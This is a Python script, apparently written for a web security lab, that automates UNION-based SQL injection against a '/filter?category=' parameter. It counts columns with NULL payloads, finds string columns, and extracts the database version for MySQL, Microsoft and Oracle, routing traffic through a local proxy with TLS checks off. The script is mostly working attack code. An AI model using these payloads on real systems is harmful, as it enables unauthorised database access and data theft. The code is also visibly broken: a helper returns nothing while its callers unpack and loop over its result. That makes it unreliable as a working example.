import sys
import urllib3
import requests
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8082','https':'http://127.0.0.1:8082'}
def noofcolumns(fullurl, payload1, payload3):
     for i in range(1,10):
        if (i == 1):
            payload = payload1 + "NULL"
        else:
            payload = payload + "," + "NULL"
        fu = fullurl + payload + payload3
        print(fu)
        r = requests.get(fu, verify=False, proxies=proxies)
        print(r)
        if (r.status_code == 200):
            print(i)

def strcolumns(fullurl, payload, payload3, i):
    payload4, payload5 = payload[:len(payload)//2+3], payload[len(payload)//2+3:]
    list_p = payload5.replace(","," ").split()
    for j in range(0,i):
        pystr= "'abc'"
        list_p[j] = pystr
        payload9 = (", ").join(list_p)
        payl = payload4 + payload9 + payload3
        fu4 = fullurl + payl
        r = requests.get(fu4, verify=False, proxies=proxies)
        if r.status_code == 200:
            print("The column of string type is ", j+1)
        else:
            list_p[j] = 'NULL'

def getdata(q):
    soup = BeautifulSoup(q.text, 'html.parser')
    rows = soup.find_all('tr')
    for row in rows:
        data = row.find_all('th') #for each row th is extrated to a list
        text = data[0].get_text() #in the list of th of a row only one element is there so 0
        print(text)
    print("BYPASSED WEBSITE.........")

def getversionanddbtype2(url):
    uri = "/filter?category="
    fullurl = url + uri
    payload1 = "'+UNION+SELECT+"
    payload3 = "#"
    #find number of columns
    i = noofcolumns(fullurl, payload1, payload3)
    print("Number of columns is:",i)
    #find if columns are of str type
    strcolumns(fullurl, payload1, payload3,i)
    #find the version and Database type for MYSQL / MICROSOFT
    for h in range(1, i+1):
        if h == 1:
            payload10 = '@@version'
        else:
            payload10 = payload10 + ',' + 'NULL'
        payload12 = payload1 + payload10 + payload3
        fu5 = fullurl + payload12
        t = requests.get(fu5, verify=False, proxies=proxies)
        getdata(t)

def getversionanddbtype(url):
    uri = "/filter?category="
    fullurl = url + uri
    payload1 = "'+UNION+SELECT+"
    payload3 = "+FROM+dual--"
    #find number of columns
    i, payload = noofcolumns(fullurl, payload1, payload3)
    print("Number of columns is:",i)
    #find if columns are of str type
    strcolumns(fullurl, payload, payload3,i)
    #find the version and Database type FOR ORACLE
    for k in range(1,i+1):
        payload8 = '+FROM+v$version--'
        if k == 1 :
            payload6 = 'banner'
        else:
            payload6 = payload6 + ',' + 'NULL'

        payload7 = payload1 + payload6 + payload8

        fu3 = fullurl + payload7

        q = requests.get(fu3, verify=False, proxies=proxies)
        getdata(q)









if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        type

    except IndexError:
        print("[-] Usage <url>")
        print("[-] Example https://example.com")

    getversionanddbtype2(url)

